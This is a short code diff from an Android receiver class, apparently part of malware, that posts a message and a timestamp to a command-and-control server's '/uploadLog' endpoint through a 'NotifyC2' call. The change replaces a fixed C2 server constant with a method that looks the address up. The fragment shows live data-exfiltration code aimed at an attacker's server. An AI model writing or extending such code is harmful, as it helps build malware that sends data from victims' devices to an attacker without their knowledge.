@@ -33,7 +33,7 @@ public class DownloadComplete extends BroadcastReceiver {
             formData += "&message=" + message;
             formData += "&timestamp=" + System.currentTimeMillis();
 
-            new NotifyC2(Utils.C2_SERVER + "/uploadLog", formData, result -> {
+            new NotifyC2(Utils.getC2Address() + "/uploadLog", formData, result -> {
 
             }).execute();
         }
